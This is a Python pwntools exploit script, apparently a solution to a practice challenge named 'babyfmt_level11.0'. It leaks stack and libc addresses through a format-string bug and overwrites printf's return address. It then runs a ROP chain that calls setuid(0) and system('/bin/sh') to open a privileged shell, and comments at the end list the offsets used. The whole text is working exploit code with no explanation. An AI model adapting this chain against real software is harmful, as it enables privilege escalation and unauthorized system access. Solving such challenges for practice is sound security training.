from pwn import *
context.binary = "/challenge/babyfmt_level11.0"
context.terminal = ['tmux','splitw','-h']
#p = gdb.debug("/challenge/babyfmt_level11.0")
p = process()
payload1 = bytes('%7$p.%18$p','utf-8')
p.sendline(payload1)
p.recvuntil(b'Your input is: ')
p.recvline()
leak = p.recvline().strip(b'\n').decode().split('.')
libc_base = int(leak[1],base=16) - 0x1db580
overwrite = int(leak[0],base=16) - 0x1a0
log.info("Libc base: %s", hex(libc_base))
log.info("Place to overwrite: %s", hex(overwrite))
log.info("Leak: %s", leak)
add_rsp = libc_base + 0xf9fcd
setuid = libc_base + 0xc2150
bin_sh = libc_base + 0x1925bd
ret = libc_base + 0x1efc8
system_func = libc_base + 0x30290
pop_rdi = libc_base + 0x1b6a
time.sleep(0.3)
payload2 = fmtstr_payload(57,{overwrite: add_rsp},56) + cyclic(0x208)
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(bin_sh) + p64(system_func)
#+ b'B'*16 + b'C'*16
#bytes('%10c%59$hhn'.ljust(16,'.'),'utf-8') + p64(overwrite)
p.sendline(payload2)
p.interactive()
#padding: 56
#+ p64(ret)






#from leak input to return address: 0x3f0
#from leak input to return address of printf: 0x1a0
#solution: overwrite return address of printf to func (the second printf)
#libc base = leak[1] - 0x1db580
#add rsp = libc base + 0xF9FCD
